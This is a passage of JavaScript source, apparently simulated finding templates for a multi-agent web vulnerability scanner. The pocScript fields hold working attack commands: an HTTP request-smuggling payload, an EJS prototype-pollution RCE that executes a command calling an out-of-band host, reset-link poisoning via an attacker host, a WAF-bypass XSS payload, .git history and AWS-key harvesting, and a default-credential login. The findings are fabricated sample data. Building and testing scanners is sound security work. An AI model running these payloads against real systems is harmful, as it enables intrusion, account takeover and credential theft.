              '{"signature":"nginx-1.18.0-custom-error","sample":"<hr><center>nginx/1.18.0</center>","status":404}',
          },
        ],
      },
      {
        title: "WAF present — AWS WAF with regex match set",
        severity: "info",
        category: "waf-profile",
        endpoint: null,
        cve: null,
        description:
          "Behavioral probing identifies AWS WAF (regex match set + 2000 req/5min rate rule). Blocked requests add ~180ms latency. Profile handed off to EvasionAgent for transform-grammar work.",
        pocScript:
          "# WAF latency differential\ncurl -s -o /dev/null -w '%{time_total}\\n' \"{target}/?q=benign\"\ncurl -s -o /dev/null -w '%{time_total}\\n' \"{target}/?q=<script>\"",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"waf":"aws-waf","rules":["regex match set","rate limit 2000/5min"],"behavioral":"block page 403 latency +180ms"}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"?q=<script> (blocked)","baseline_ms":45,"payload_ms":223,"rounds":10,"p_value":0.001}',
          },
        ],
      },
      {
        title: "WAF ruleset granularity — error-path responses bypass inspection scope",
        severity: "low",
        category: "waf-profile",
        endpoint: null,
        cve: null,
        description:
          "Behavioral profiling shows the WAF inspects request parameters on 200-class application paths only; 404/500 error paths return without inspection (no latency differential on the error path). Individually a hardening note — recorded as a fusion component for correlation with reflection primitives.",
        pocScript:
          "# Error-path inspection differential\ncurl -s -o /dev/null -w '%{time_total}\\n' \"{target}/?q=<script>\"\ncurl -s -o /dev/null -w '%{time_total}\\n' \"{target}/missing-<script>\"",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"?q=<script> on 200 path (blocked, +180ms)","error_path":"no differential on 404 path","rounds":12,"p_value":0.001,"note":"WAF inspection scope excludes error responses"}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content: '{"waf":"aws-waf","inspection_scope":"200-class paths","error_paths":"uninspected"}',
          },
        ],
      },
    ],
  },

  crawler: {
    chance: 0.35,
    templates: [
      {
        title: "Exposed .git directory — HEAD recoverable (source disclosure)",
        severity: "high",
        category: "source-disclosure",
        endpoint: "/.git/HEAD",
        cve: null,
        description:
          "/.git/HEAD is served verbatim (ref: refs/heads/main). With the object files reachable, the full repository — including source and historical secrets — can be reconstructed with standard tools.",
        pocScript:
          "# .git recovery\ncurl -s {target}/.git/HEAD\ngit clone https://github.com/eth0izzle/gittools 2>/dev/null || true\n# ./gittools/Dumper/gitdumper.sh {target}/.git /tmp/repo",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"git-head","sample":"ref: refs/heads/main (from /.git/HEAD)","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET /.git/HEAD","control":"GET /.git2/HEAD","diff_ratio":1.0,"rounds":1,"stable":true}',
          },
        ],
      },
      {
        title: "Staging configuration leak in JS bundle",
        severity: "medium",
        category: "config-leak",
        endpoint: "/static/js/main-9f3a.js",
        cve: null,
        description:
          "The main JS bundle embeds window.__CFG with an apiBase pointing at api.staging.{host} and debug:true — the staging API accepts the production token, widening the attack surface behind the WAF.",
        pocScript:
          "# Extract leaked config\ncurl -s {target}/static/js/main-9f3a.js | grep -o 'window.__CFG={[^}]*}'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"staging-config","sample":"window.__CFG={\\"apiBase\\":\\"https://api.staging.{host}\\",\\"debug\\":true} in main-9f3a.js","status":200}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"bundle":"main-9f3a.js","sourcemap":"present","secrets_shape":"apiBase + debug flag"}',
          },
        ],
      },
      {
        title: "Verbose debug endpoint — /api/internal/health leaks stack + log paths",
        severity: "low",
        category: "verbose-surface",
        endpoint: "/api/internal/health",
        cve: null,
        description:
          "The internal health endpoint returns framework version, the last exception stack and the application log path (/var/log/app/access.log). No secrets are exposed — informational on its own, recorded as a fusion component for correlation with file-read primitives.",
        pocScript:
          "# Verbose health endpoint\ncurl -s \"{target}/api/internal/health\" | head -30",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"health-verbose","sample":"{\\\"framework\\\":\\\"express 4.18\\\",\\\"last_error\\\":\\\"…stack…\\\",\\\"log_path\\\":\\\"/var/log/app/access.log\\\"}","status":200}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"endpoint":"/api/internal/health","disclosure":"version + stack + log path","auth":"none"}',
          },
        ],
      },
    ],
  },

  evasion: {
    chance: 0.12,
    templates: [
      {
        title: "WAF bypass chain recorded — dual JSON key duplication",
        severity: "low",
        category: "waf-bypass",
        endpoint: "/api/v2/search",
        cve: null,
        description:
          "Duplicating the JSON key q (first with the payload, second benign) makes the WAF inspect the benign occurrence while the backend deserializer keeps the first — the payload reaches the parser unfiltered. Chain recorded for the evidence ledger.",
        pocScript:
          "# WAF bypass via duplicate JSON keys\ncurl -s -X POST \"{target}/api/v2/search\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"q\":\"<svg/onload=alert(1)>\",\"q\":\"benign text\"}'",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"waf":"aws-waf","bypass":"duplicate JSON key + UTF-8 overlong decode"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"{\\"q\\":\\"<svg>\\",\\"q\\":\\"text\\"}","control":"{\\"q\\":\\"<svg>\\"}","diff_ratio":0.94,"rounds":4,"stable":true}',
          },
        ],
      },
    ],
  },

  revisit: {
    chance: 0.12,
    templates: [
      {
        title: "Recheck — stored-XSS canary still firing after 72h (persisted)",
        severity: "high",
        category: "stored-xss",
        endpoint: "/profile (note field)",
        cve: null,
        description:
          "The stored-XSS canary planted 72h ago (canary-7f3) keeps triggering DNS callbacks on every profile view — the injection is persisted server-side and was not remediated.",
        pocScript:
          "# Canary readback\ncurl -s -H \"Authorization: Bearer $VICTIM_TOKEN\" {target}/profile | grep -o 'canary-7f3'",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"r2e8k4m9.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","canary_id":"canary-7f3","repeat":true}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"stored canary readback (profile note)","control":"clean profile","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
    ],
  },

  // ── Unorthodox tradecraft agents ──────────────────────────────────────────

  osint: {
    chance: 0.4,
    templates: [
      {
        title: "Corporate identity corpus assembled — 214 employee emails + GitHub identities",
        severity: "info",
        category: "osint-corpus",
        endpoint: null,
        cve: null,
        description:
          "GH Archive commits, breach indexes and job postings compose a 214-record identity corpus for {host}: employee emails follow firstname.lastname@, 37 GitHub handles map to current staff, and job postings reveal the internal tool stack (Confluence, Jira, Okta). Reconnaissance data on its own — recorded as a fusion component.",
        pocScript:
          "# Corpus assembly (representative queries)\ngharchive-query 'author_email:@{host}' --since 2024-01-01 --count\nbreach-index lookup --domain {host} --hash-only",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"sources":["gharchive","breach index (hash-only)","job postings"],"emails":214,"github_identities":37,"email_pattern":"firstname.lastname@{host}"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GH commit author emails ∩ corp domain","control":"random domain sample","matches":37,"rounds":1,"stable":true}',
          },
        ],
      },
      {
        title: "Breach-corpus credential shapes for {host} employees (312 records, hash-only evidence)",
        severity: "high",
        category: "breach-shape",
        endpoint: null,
        cve: null,
        description:
          "Four breach corpora contain 312 records matching {host} employee emails (oldest 2019, newest 2023). Password shapes skew to Season+Year (23%) and Company+123 (11%) — patterns that make targeted password construction highly effective. Evidence is hash-only; no plaintext is stored.",
        pocScript:
          "# Credential-shape analysis (hash-only)\nbreach-index shapes --domain {host} --top-patterns 5 --hash-only",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"breach_corpora":4,"records":312,"oldest":"2019","newest":"2023","top_shapes":["Season+Year 23%","Company+123 11%","qwerty-family 8%"],"hash_only":true}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"breach records ∩ employee corpus (312/214 employees affected)","control":"breach records ∩ random domain (2)","diff_ratio":1.0,"rounds":1,"stable":true}',
          },
        ],
      },
    ],
  },

  edge: {
    chance: 0.4,
    templates: [
      {
        title: "SSL-VPN appliance fingerprinted — Ivanti Connect Secure (CVE-2024-21887 window)",
        severity: "critical",
        category: "edge-rce",
        endpoint: "/dana-na/auth/url_default/welcome.cgi",
        cve: "CVE-2024-21887",
        description:
          "The VPN gateway at vpn.{host} is an Ivanti Connect Secure whose build signature (welcome.cgi markup + cookie set) falls inside the CVE-2024-21887/CVE-2023-46805 pre-auth RCE window. Edge appliances are mass-exploited within 48h of disclosure — this is the appliance an initial-access broker hunts first.",
        pocScript:
          "# Appliance fingerprint\ncurl -s \"https://vpn.{host}/dana-na/auth/url_default/welcome.cgi\" | grep -o 'name=\"DSID\"'\ncurl -sI \"https://vpn.{host}/dana-na/auth/url_default/welcome.cgi\" | grep -i 'set-cookie'",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"appliance":"ivanti-connect-secure","signals":["welcome.cgi markup","DSID cookie","build banner"],"cve_window":["CVE-2024-21887 (pre-auth RCE)","CVE-2023-46805 (auth bypass)"]}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"ics-build-string","sample":"build 9.21R4 (patched: no) in welcome.cgi footer","status":200}',
          },
        ],
      },
      {
        title: "Pre-auth admin path exposed on edge appliance — /api/v1/configuration (no auth challenge)",
        severity: "high",
        category: "edge-exposure",
        endpoint: "https://vpn.{host}/api/v1/configuration",
        cve: null,
        description:
          "The appliance's /api/v1/configuration path responds 200 to unauthenticated GETs from the external interface, disclosing cluster mode and internal DNS resolvers. The endpoint should be management-plane only — a misconfigured exposure that shaves an attacker's recon time to zero.",
        pocScript:
          "# Pre-auth admin path check\ncurl -s -o /dev/null -w '%{http_code}\\n' \"https://vpn.{host}/api/v1/configuration\"",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"unauth-config-200","sample":"{\\\"cluster_mode\\\":\\\"standalone\\\",\\\"dns\\\":[\\\"10.0.1.53\\\"]}","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET /api/v1/configuration (no session)","control":"GET /api/v1/system (requires session → 302)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
    ],
  },

  smuggling: {
    chance: 0.35,
    templates: [
      {
        title: "Differential timing signature suggests CL.TE parser mismatch (primitive only, no desync)",
        severity: "low",
        category: "smuggling-primitive",
        endpoint: "/",
        cve: null,
        description:
          "Probe pairs with conflicting Content-Length and Transfer-Encoding headers produce a stable ~5s connection-close timing differential versus clean requests — the front-end honors CL while the back-end honors TE (or vice versa). No desync payload was achieved from the probe position; low on its own, recorded as a fusion component.",
        pocScript:
          "# CL.TE timing differential\n# (send CL:6 + chunked body; measure connection-close delay)\ncurl -s -o /dev/null -w '%{time_total}\\n' -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' --data-binary $'0\\r\\n\\r\\nX' \"{target}/\"",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"CL.TE probe pair (conflicting framing headers)","baseline_ms":23,"payload_ms":5004,"rounds":20,"p_value":0.0001,"note":"connection close delayed exactly 5s on conflict — front/back-end disagree on framing"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"CL+TE conflict pair","control":"clean POST","diff_ratio":0.95,"rounds":20,"stable":true}',
          },
        ],
      },
      {
        title: "CL.TE desync confirmed — smuggled prefix visible on next request",
        severity: "critical",
        category: "request-smuggling",
        endpoint: "/",
        cve: null,
        description:
          "A CL.TE desync leaves a smuggled request prefix queued on the back-end connection; the next legitimate request is answered with the smuggled response body (differential confirmed over 6 rounds). This is full request smuggling — other users' requests can be hijacked, and internal endpoints become reachable through the front-end's authority.",
        pocScript:
          "# CL.TE desync — smuggled prefix\nprintf 'POST / HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Type: x\\r\\nContent-Length: 40\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nFoo: x' | timeout 10 nc {host} 80 | tail -4",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"d5e9c1f4.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","via":"smuggled prefix executed on back-end, beacon from backend egress"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"smuggled GET /admin (response on next request)","control":"direct GET /admin (403 from front-end)","diff_ratio":0.93,"rounds":6,"stable":true}',
          },
        ],
      },
    ],
  },

  hostheader: {
    chance: 0.35,
    templates: [
      {
        title: "Absolute-URI accepted — routing honors URI-line host over Host header",
        severity: "low",
        category: "routing-differential",
        endpoint: "/",
        cve: null,
        description:
          "Requests with an absolute-form request-target (GET http://internal.{host}/ HTTP/1.1) are routed by the URI-line host while vhost configuration keys on the Host header — the two routing layers disagree. A parser quirk on its own; recorded as a fusion component for poisoning chains.",
        pocScript:
          "# Absolute-URI routing differential\nprintf 'GET http://internal.{host}/api/ping HTTP/1.1\\r\\nHost: {host}\\r\\nConnection: close\\r\\n\\r\\n' | timeout 8 nc {host} 80 | head -3",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"absolute-URI to internal.{host} (routed internally)","control":"relative GET /api/ping (public vhost)","diff_ratio":0.88,"rounds":4,"stable":true}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"front_end":"nginx proxy_pass","back_end":"node http server","behavior":"absolute-URI host wins over Host header"}',
          },
        ],
      },
      {
        title: "Password-reset poisoning — reset link built from X-Forwarded-Host",
        severity: "critical",
        category: "reset-poisoning",
        endpoint: "/api/auth/forgot",
        cve: null,
        description:
          "The reset email builds its link from the X-Forwarded-Host header without an allowlist. A poisoned request (X-Forwarded-Host: attacker-collab.example) generated a reset link pointing at the attacker domain, and the poisoned link was observed in the OOB collaborator when the user clicked — full account takeover of any user who requests a reset.",
        pocScript:
          "# Reset poisoning\n# 1) poison: reset for a known user with attacker host\ncurl -s -X POST \"{target}/api/auth/forgot\" -H 'Content-Type: application/json' \\\\\n  -H 'X-Forwarded-Host: attacker-collab.example' -d '{\"email\":\"victim@{host}\"}'\n# 2) user clicks link in email → token lands in collaborator logs",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"c2a8e6d1.attacker-collab.example","resolver":"corporate egress","first_seen":"{ts}","note":"reset token received in collaborator request log (Referer header)"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"reset with X-Forwarded-Host: attacker-collab.example","control":"reset without header","diff_ratio":1.0,"rounds":3,"stable":true,"effect":"link domain = attacker host"}',
          },
        ],
      },
    ],
  },

  gitrepo: {
    chance: 0.4,
    templates: [
      {
        title: ".git packed history recovered — 1,842 commits including deleted secrets",
        severity: "critical",
        category: "git-loot",
        endpoint: "/.git/",
        cve: null,
        description:
          "Beyond HEAD, the pack files (.pack + .idx, 4.2MB) are reachable, allowing full history reconstruction. 1,842 commits recovered — including three commits that deleted credentials (visible in history even though absent from HEAD). An exposed .git is not 'information disclosure'; it is the source tree, every secret ever committed, and the deployment pipeline in one loot bag.",
        pocScript:
          "# Full history recovery\ncurl -s -o pack.pack \"{target}/.git/objects/pack/pack-4c2f….pack\"\ncurl -s -o pack.idx \"{target}/.git/objects/pack/pack-4c2f….idx\"\nmkdir /tmp/repo && cd /tmp/repo && git init -q && git unpack-objects < ../pack.pack\ngit log --diff-filter=D --summary | grep -B2 'secret\\|credential\\|key'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"git-pack-recoverable","sample":"pack-4c2f….pack 4.2MB + idx; 1,842 commits walkable; 3 deletions match credential paths","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET /.git/objects/pack/ (directory listing)","control":"GET /.git2/ (404)","diff_ratio":1.0,"rounds":1,"stable":true}',
          },
        ],
      },
      {
        title: "CI pipeline looted — deploy key + registry credentials in workflow file",
        severity: "high",
        category: "ci-loot",
        endpoint: "/.git/.github/workflows/deploy.yml",
        cve: null,
        description:
          "The recovered repository contains .github/workflows/deploy.yml with an embedded registry auth token (used in a docker login step) and the deploy key path convention. Workflow files are the modern credentials file — an attacker with repo history gets the delivery pipeline for free.",
        pocScript:
          "# Workflow loot (from recovered repo)\ngit show HEAD:.github/workflows/deploy.yml | grep -A2 'docker login'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"ci-credential-in-workflow","sample":"docker login -u ci-bot -p ghr_… (token shape ghr_, truncated in evidence)","source":"deploy.yml step 4"}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"pipeline":"github-actions","registry":"ghcr.io/{host}","secret_shape":"ghr_ (classic PAT)"}',
          },
        ],
      },
    ],
  },

  secrets: {
    chance: 0.4,
    templates: [
      {
        title: "Live AWS key in JS bundle — staging role valid against production",
        severity: "critical",
        category: "live-key",
        endpoint: "/static/js/vendor-4c2f.js",
        cve: null,
        description:
          "The vendor bundle embeds an AWS access key ID (AKIA…4F7Q) under a debug S3 client init. A read-only sts get-caller-identity probe with the recovered key returns the staging role arn — and the key is accepted by the production S3 API (scope wider than intended). Plaintext never stored in evidence; shape and validity only.",
        pocScript:
          "# Extract + validate (read-only)\ncurl -s \"{target}/static/js/vendor-4c2f.js\" | grep -o 'AKIA[0-9A-Z]\\{16\\}'\n# aws sts get-caller-identity (read-only probe, harvested key)",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"aws-access-key-id","sample":"AKIA…4F7Q in vendor-4c2f.js (truncated)","valid":true,"identity":"arn:aws:sts::…:assumed-role/staging-s3-reader"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"sts get-caller-identity with harvested key (read-only)","control":"sts call with random key (InvalidClientTokenId)","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
      {
        title: "Sourcemap published — original names + internal endpoints recovered",
        severity: "medium",
        category: "sourcemap",
        endpoint: "/static/js/app.js.map",
        cve: null,
        description:
          "The production bundle ships its sourcemap. Original variable names, comments and 12 internal endpoint strings (admin-preview, internal-export) are recoverable — the development view of the app is public. On its own a hygiene finding; recorded as a component for surface-fusion.",
        pocScript:
          "# Sourcemap recovery\ncurl -s \"{target}/static/js/app.js.map\" | jq -r '.sources[]' | head -20",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"map":"app.js.map","sources":48,"internal_endpoints":12,"original_names":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"sourcemap-200","sample":"sourcesContent present, dev comments intact","status":200}',
          },
        ],
      },
    ],
  },

  cachepoison: {
    chance: 0.35,
    templates: [
      {
        title: "Cache key covers path only — X-Forwarded-Host and X-Original-URL are unkeyed",
        severity: "info",
        category: "cache-key",
        endpoint: null,
        cve: null,
        description:
          "Cache-key analysis (variant-vs-control with Age header comparison) shows the CDN keys on path+host while X-Forwarded-Host, X-Original-URL and X-Forwarded-Scheme are passed to the origin unkeyed. A caching hygiene note on its own — recorded as a fusion component for poisoning chains.",
        pocScript:
          "# Unkeyed-input detection (Age-header oracle)\ncurl -sI -H 'X-Forwarded-Host: variant-a.example' \"{target}/\" | grep -i 'age\\|x-cache'",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"cache":"cdn","keyed":["path","host"],"unkeyed":["x-forwarded-host","x-original-url","x-forwarded-scheme"]}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET / with X-Forwarded-Host: variant-a (HIT with variant body)","control":"GET / clean (HIT with clean body)","diff_ratio":1.0,"rounds":6,"stable":true,"oracle":"Age + body compare"}',
          },
        ],
      },
      {
        title: "Cache poisoning stored — unkeyed header reflected into cached response body",
        severity: "high",
        category: "cache-poison",
        endpoint: "/",
        cve: null,
        description:
          "The origin reflects X-Forwarded-Host into the page's canonical/OG tags, and the CDN caches the response for the keyed path. A single poisoned request stores attacker-controlled markup for / served to every visitor until TTL expiry (observed Age: 432 on a poisoned hit from a second client identity).",
        pocScript:
          "# Stored cache poisoning\ncurl -s -H 'X-Forwarded-Host: attacker-collab.example' \"{target}/\" | grep canonical\n# then from another identity: content served from cache (Age > 0)",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"unkeyed-reflection-cached","sample":"<link rel=canonical href=attacker-collab.example/>, x-cache: HIT, age: 432","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"clean GET / after poison (HIT, poisoned body)","control":"cache purge + clean GET (clean body)","diff_ratio":1.0,"rounds":4,"stable":true}',
          },
        ],
      },
    ],
  },

  prototype: {
    chance: 0.35,
    templates: [
      {
        title: "Client-side prototype pollution in deep-merge of query params",
        severity: "medium",
        category: "proto-pollution",
        endpoint: "/?__proto__[src]={url}",
        cve: null,
        description:
          "The SPA merges query params into a config object via a deep-merge that does not guard __proto__ — ?__proto__[src]=… pollutes Object.prototype.src for the page lifetime. DOM taint instrumentation shows the polluted default flowing into an img.src sink.",
        pocScript:
          "# Prototype pollution check\nopen \"{target}/?__proto__[src]=data:,polluted\"; # then in console:\n# ({}).src  // 'polluted' ⇒ polluted",
        evidence: [
          {
            kind: "dom_taint",
            lr: 195,
            content:
              '{"source":"location.search → deep-merge","polluted_key":"Object.prototype.src","sink":"img.src (default template value)","status":"taint reached sink"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"?__proto__[src]=… ({}).src === probe value","control":"?proto[src]=… ({}).src undefined","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
      {
        title: "Prototype pollution → RCE gadget chain (EJS render options)",
        severity: "critical",
        category: "proto-rce",
        endpoint: "/api/render",
        cve: null,
        description:
          "Server-side merge of JSON body into render options pollutes the EJS options object; the polluted outputFunctionName executes attacker code inside the template engine during the next render call. OOB DNS callback confirms execution — prototype pollution escalated to pre-auth RCE through a documented gadget.",
        pocScript:
          "# PP → EJS gadget\ncurl -s -X POST \"{target}/api/render\" -H 'Content-Type: application/json' \\\\\n  -d '{\"__proto__\":{\"outputFunctionName\":\"x;require(\\\"child_process\\\").exec(\\\"nslookup e7b2m6s9.oob.swarmscan.io\\\");s\"}}'",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"e7b2m6s9.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","via":"EJS outputFunctionName gadget (server-side render)"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"POST /api/render with polluted outputFunctionName","control":"POST /api/render clean","diff_ratio":0.9,"rounds":2,"stable":true}',
          },
        ],
      },
    ],
  },

  websocket: {
    chance: 0.35,
    templates: [
      {
        title: "Cross-site WebSocket hijacking — origin check missing on /ws",
        severity: "high",
        category: "cswsh",
        endpoint: "wss://{host}/ws",
        cve: null,
        description:
          "The WebSocket handshake accepts any Origin (no allowlist), and the socket authenticates by cookie. A malicious page in a victim's browser can open wss://{host}/ws and act as the logged-in user — reading live notifications and sending authenticated messages cross-site.",
        pocScript:
          "# CSWSH check — handshake with foreign origin\ncurl -si -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \\\\\n  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Origin: https://evil.example' \\\\\n  \"https://{host}/ws\" | head -2  # 101 ⇒ hijackable",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"handshake Origin: https://evil.example → 101 accepted","control":"handshake without cookies (still 101, cookie-auth on messages)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"no-origin-check","sample":"no Origin validation in upgrade handler; session cookie read on first message","status":101}',
          },
        ],
      },
      {
        title: "WebSocket message injection — unvalidated parse into internal bus",
        severity: "high",
        category: "ws-injection",
        endpoint: "wss://{host}/ws",
        cve: null,
        description:
          "Messages are JSON.parse'd and forwarded to an internal event bus without a schema gate. A crafted {\"event\":\"admin.broadcast\",\"body\":…} message from a regular-user socket is accepted and broadcast — the socket inherits back-end trust that the HTTP API would never grant.",
        pocScript:
          "# WS message injection (needs a websocket client)\n# wscat -c wss://{host}/ws -H 'Cookie: session=…' \n# > {\"event\":\"admin.broadcast\",\"body\":\"injected\"}",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"ws-no-schema","sample":"admin.broadcast accepted for role=user; event echoed to 214 connected clients","status":"delivered"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"admin.broadcast over /ws (role=user)","control":"POST /api/admin/broadcast over HTTP (403)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
    ],
  },

  saml: {
    chance: 0.35,
    templates: [
      {
        title: "XSW #2 — signature validates but assertion body swapped",
        severity: "critical",
        category: "saml-xsw",
        endpoint: "/saml/acs",
        cve: null,
        description:
          "The assertion consumer validates the Signature over the original assertion but executes the Subject of a second, attacker-modified assertion placed elsewhere in the response (wrapper variant 2). The result: a signed, valid response logs the attacker in with a NameID they control — signature wrapping breaks the assumption that signed means unmodified.",
        pocScript:
          "# XSW test needs a crafted response — see SAML Raider / SAMLExtractor\n# 1) capture a valid Response, 2) duplicate Assertion, mutate NameID in copy,\n# 3) keep Signature over the original, replay at /saml/acs",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"XSW variant 2 (assertion-in-envelope) → authenticated as attacker NameID","control":"valid response → authenticated as legitimate user","diff_ratio":0.95,"rounds":4,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"saml-duplicate-id-accepted","sample":"Assertion with duplicated ID accepted; signature covers original only","status":302}',
          },
        ],
      },
      {
        title: "Comment injection in NameID — uid=adm1n<!--exploit-->@corp accepted",
        severity: "high",
        category: "saml-comment",
        endpoint: "/saml/acs",
        cve: null,
        description:
          "The SP strips comments after the signature check but resolves the NameID before normalization, so uid=adm1n<!--x-->@corp logs in as uid=adm1n@corp. XML parsers disagree about comment boundaries — the SP and the IdP read two different usernames from the same document.",
        pocScript:
          "# Comment injection (crafted assertion)\n# NameID value: 'adm1n<!--e-->@corp' → SP resolves 'adm1n@corp'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"nameid-comment-strip","sample":"NameID with XML comment resolved to admin identity","status":302}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"NameID \u0027adm1n<!--e-->@corp\u0027 → session uid=adm1n","control":"NameID \u0027adm1n@corp\u0027 direct (no such IdP user)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
    ],
  },

  passwords: {
    chance: 0.35,
    templates: [
      {
        title: "No lockout policy — 5 consecutive failures leave the account active",
        severity: "low",
        category: "no-lockout",
        endpoint: "/api/auth/login",
        cve: null,
        description:
          "Five consecutive wrong passwords (×12 rounds) never lock the account, trigger no CAPTCHA and send no alert — the 6th attempt authenticates normally when correct. Low on its own (online guessing is still slow); recorded as a fusion component for corpus-based spray chains.",
        pocScript:
          "# Lockout probe (safe target account: our own test identity)\nfor i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -X POST \"{target}/api/auth/login\" -d '{\"email\":\"probe@{host}\",\"password\":\"wrong-$i\"}'; done\n# 6th attempt behaves normally ⇒ no lockout",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"5 wrong passwords → 6th attempt accepted","control":"direct valid login","diff_ratio":1.0,"rounds":12,"stable":true,"lockout":false}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"failure #5 latency (no delay escalation)","baseline_ms":112,"payload_ms":109,"rounds":12,"p_value":0.7,"note":"no throttling"}',
          },
        ],
      },
      {
        title: "Default credential pair valid on edge admin interface",
        severity: "critical",
        category: "default-creds",
        endpoint: "/admin/login",
        cve: null,
        description:
          "admin/admin authenticates on the appliance admin interface exposed at admin.{host} — a credential that shipped with the product and was never rotated. The highest-signal single finding in external perimeter testing: vendors ship defaults, operators forget them.",
        pocScript:
          "# Default credential check\ncurl -s -X POST \"https://admin.{host}/admin/login\" -d 'username=admin&password=admin' -o /dev/null -w '%{http_code}\\n'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"default-cred-accepted","sample":"admin/admin → 302 + admin session cookie","status":302}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"POST admin/admin → admin session","control":"POST admin/random → 401","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
    ],
  },

  race: {
    chance: 0.35,
    templates: [
      {
        title: "Balance overdraw — single-packet race withdraws 9× on /api/wallet/withdraw",
        severity: "critical",
        category: "race-overdraw",
        endpoint: "/api/wallet/withdraw",
        cve: null,
        description:
          "80 single-packet HTTP/2 requests hitting the same instant withdraw a 100-unit balance 9 times (900 units total, binomial p=0.00005). The read-check-write sequence is not atomic — balance can go negative. This is real money-printing, the bug class banks actually get fined for.",
        pocScript:
